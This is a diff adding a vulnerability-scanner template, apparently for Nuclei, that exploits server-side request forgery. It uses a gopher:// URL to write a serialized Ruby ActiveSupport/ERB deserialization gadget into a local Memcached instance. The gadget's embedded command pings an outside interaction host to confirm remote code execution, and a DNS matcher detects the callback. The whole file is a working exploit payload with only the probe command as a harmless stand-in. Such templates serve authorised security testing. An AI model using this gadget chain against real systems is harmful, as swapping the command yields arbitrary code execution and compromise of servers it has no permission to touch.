@@ -1,0 +1,18 @@
+id: gopher-memcached-ruby-rce
+info:
+  name: Memcached Ruby Deserialization RCE via Gopher
+  author: jakelo-ai
+  severity: critical
+  description: Exploit SSRF to inject malicious Ruby object into Memcached triggering interactsh.
+  tags: ssrf,gopher,memcached,ruby,rce,oast,custom
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%2060%20228%0d%0a%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%06%3A%09%40srcI%22%2F%25x%28ping%20-c%201%20{{interactsh-url}}%29%3B%06%3A%06ET%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatoro%3A%1FActiveSupport%3A%3ADeprecation%06%3A%0E%40silencedT%0d%0a"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
